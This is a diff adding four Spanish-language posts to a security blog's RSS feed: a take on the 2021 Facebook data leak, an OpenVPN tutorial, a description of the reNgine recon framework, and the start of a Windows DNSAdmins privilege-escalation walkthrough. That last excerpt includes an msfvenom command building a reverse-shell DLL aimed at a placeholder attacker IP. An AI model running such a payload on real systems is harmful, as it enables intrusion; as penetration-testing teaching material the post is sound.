@@ -217,6 +217,79 @@
     </item>
     
     <item>
+      <title>No, Facebook no ha sido hackeado ni ha tenido una brecha de seguridad</title>
+      <link>http://localhost:1313/es/posts/no-facebook-no-ha-sido-hackeado-ni-ha-tenido-una-brecha-de-seguridad/</link>
+      <pubDate>Mon, 05 Apr 2021 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/es/posts/no-facebook-no-ha-sido-hackeado-ni-ha-tenido-una-brecha-de-seguridad/</guid>
+      
+      <description>&lt;p&gt;Recientemente, ha saltado una noticia en diversos medios de comunicación y RRSS sobre una supuesta brecha de seguridad en Facebook que expondría la información de &lt;strong&gt;533 millones de personas&lt;/strong&gt; de todo el mundo, en concreto, sus números telefónicos y direcciones.&lt;/p&gt;
+&lt;p&gt;Esta entrada tiene como finalidad &lt;strong&gt;dar a conocer el impacto real&lt;/strong&gt; de dicha brecha de seguridad (desde mi punto de vista) a aquellos usuarios que no tienen la posibilidad de acceder a ella o han sido mal informados por ciertos medios de comunicación o «Gurús» de la ciberseguridad de este país.&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>Crear tu propia VPN sin logs</title>
+      <link>http://localhost:1313/es/posts/crear-tu-propia-vpn-sin-logs/</link>
+      <pubDate>Tue, 24 Nov 2020 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/es/posts/crear-tu-propia-vpn-sin-logs/</guid>
+      
+      <description>&lt;p&gt;Bienvenidos a este tutorial sobre como montar nuestra propia &lt;strong&gt;VPN sin logs&lt;/strong&gt; mediante la configuración de un servidor &lt;strong&gt;OpenVPN&lt;/strong&gt; en una máquina en la nube.&lt;/p&gt;
+&lt;p&gt;Antes de empezar con el tutorial, deberemos de crear una máquina en la nube, yo he usado el &lt;strong&gt;VPS de DigitalOcean&lt;/strong&gt; en el cual tengo una máquina Ubuntu 20.04 por 5$ al mes, puedes usar el siguiente &lt;a href=&#34;https://m.do.co/c/67dd38080d62&#34;&gt;enlace&lt;/a&gt; para obtener &lt;strong&gt;100$&lt;/strong&gt; gratis.&lt;/p&gt;
+&lt;h2 id=&#34;crear-una-máquina-en-la-nube&#34;&gt;Crear una máquina en la nube&lt;/h2&gt;
+&lt;p&gt;Como he comentado al principio, he elegido DigitalOcean como VPS, pero existen otros como Linode, Azure o AWS. Para crear una máquina Ubuntu 20.04 deberemos de ir a la parte superior derecha de nuestro panel y seleccionar &lt;strong&gt;Create -&amp;gt; Droplets&lt;/strong&gt;.&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>reNgine – Framework de reconocimiento automatizado para aplicaciones web</title>
+      <link>http://localhost:1313/es/posts/rengine-framework-de-reconocimiento-automatizado-para-aplicaciones-web/</link>
+      <pubDate>Mon, 19 Oct 2020 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/es/posts/rengine-framework-de-reconocimiento-automatizado-para-aplicaciones-web/</guid>
+      
+      <description>&lt;h2 id=&#34;1-sobre-rengine&#34;&gt;1. Sobre reNgine&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;http://localhost:1313/images/rengine-framework-de-reconocimiento-automatizado-para-aplicaciones-web/rengine-framework-de-reconocimiento-automatizado-para-aplicaciones-web_001.png&#34;&gt;&lt;img src=&#34;http://localhost:1313/images/rengine-framework-de-reconocimiento-automatizado-para-aplicaciones-web/rengine-framework-de-reconocimiento-automatizado-para-aplicaciones-web_001.png&#34; alt=&#34;/images/rengine-framework-de-reconocimiento-automatizado-para-aplicaciones-web/rengine-framework-de-reconocimiento-automatizado-para-aplicaciones-web_001.png&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Dashboard de la aplicación reNgine&lt;/p&gt;
+&lt;p&gt;reNgine es un &lt;strong&gt;framework de reconocimineto automatizado para aplicaciones web&lt;/strong&gt; utilizado para realizar la fase de recopilación de información durante las auditorías, cuenta con varios motores de escaneo personalizables que pueden ayudarnos para:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Escanear puertos en los servidores de aplicaciones.&lt;/li&gt;
+&lt;li&gt;Enumerar subdominios.&lt;/li&gt;
+&lt;li&gt;Buscar directorios y archivos.&lt;/li&gt;
+&lt;li&gt;Encontrar endpoints.&lt;/li&gt;
+&lt;li&gt;Tomar capturas de pantalla.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a href=&#34;http://localhost:1313/images/rengine-framework-de-reconocimiento-automatizado-para-aplicaciones-web/rengine-framework-de-reconocimiento-automatizado-para-aplicaciones-web_002.png&#34;&gt;&lt;img src=&#34;http://localhost:1313/images/rengine-framework-de-reconocimiento-automatizado-para-aplicaciones-web/rengine-framework-de-reconocimiento-automatizado-para-aplicaciones-web_002.png&#34; alt=&#34;/images/rengine-framework-de-reconocimiento-automatizado-para-aplicaciones-web/rengine-framework-de-reconocimiento-automatizado-para-aplicaciones-web_002.png&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Diagrama de flujo de reNgine&lt;/p&gt;
+&lt;p&gt;Lo realmente importante de reNgine, es que nos permite reunir &lt;strong&gt;toda la información en un solo lugar&lt;/strong&gt;, además, podemos hacer búsquedas en los resultados para, por ejemplo, &lt;strong&gt;obtener todos los subdominios que usen PHP y su estado sea 200 OK.&lt;/strong&gt;&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>Escalada de privilegios en Windows mediante grupo Administradores de DNS</title>
+      <link>http://localhost:1313/es/posts/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/</link>
+      <pubDate>Thu, 16 Apr 2020 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/es/posts/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/</guid>
+      
+      <description>&lt;p&gt;Cuando tomamos el control de una máquina, el siguiente paso es la &lt;strong&gt;escalada de privilegios&lt;/strong&gt; para hacernos con el control total de ella. En la siguiente entrada, veremos como conseguirlo aprovechándonos del &lt;strong&gt;grupo de administradores DNS&lt;/strong&gt; y la inyección de una dll maliciosa.&lt;/p&gt;
+&lt;h2 id=&#34;pasos-a-seguir&#34;&gt;Pasos a seguir&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;Comprobar que el usuario comprometido forma parte del grupo de administradores DNS.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;whoami /all
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;http://localhost:1313/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_001.png&#34;&gt;&lt;img src=&#34;http://localhost:1313/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_001.png&#34; alt=&#34;/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_001.png&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Comprobación del grupo de administradores DNS&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;strong&gt;Generar un payload&lt;/strong&gt; con una shell reversa mediante el uso de &lt;strong&gt;msfvenom&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msfvenom -p windows/x64/shell_reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=[&lt;/span&gt;IP-ATACANTE&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=[&lt;/span&gt;PUERTO-ATACANTE&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; --platform&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;windows -f dll &amp;gt; ~/payloads/plugin.dll
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;http://localhost:1313/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_002.png&#34;&gt;&lt;img src=&#34;http://localhost:1313/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_002.png&#34; alt=&#34;/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_002.png&#34;&gt;&lt;/a&gt;&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
       <title>Enviar tráfico de Burp Suite a través de VPS</title>
       <link>http://localhost:1313/es/posts/enviar-trafico-de-burp-suite-a-traves-de-vps/</link>
       <pubDate>Mon, 13 Apr 2020 00:00:00 +0000</pubDate>
